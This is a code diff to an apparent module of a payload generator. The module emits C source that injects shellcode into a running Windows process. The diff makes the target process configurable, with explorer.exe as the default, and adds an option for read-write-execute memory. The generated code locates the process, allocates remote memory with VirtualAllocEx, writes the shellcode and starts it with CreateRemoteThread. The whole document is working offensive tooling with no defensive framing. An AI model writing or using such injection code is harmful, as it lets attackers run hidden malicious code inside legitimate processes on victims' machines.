@@ -1,6 +1,12 @@
 class processinject:
     def __init__(self, arguments):
-        pass
+        self.memoryPermission = 'PAGE_EXECUTE_READ'
+        self.target = 'explorer.exe'
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+        if 'target' in arguments:
+            self.target = arguments['target']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -39,7 +45,7 @@ int main(void) {{
     }}
             
     while (Process32Next(hProcSnap, &pe32)) {{
-        if (lstrcmpiA("explorer.exe", pe32.szExeFile) == 0) {{
+        if (lstrcmpiA("{self.target}", pe32.szExeFile) == 0) {{
                 pid = pe32.th32ProcessID;
                 break;
         }}
@@ -55,7 +61,7 @@ int main(void) {{
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READ);
+    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, {self.memoryPermission});
     WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
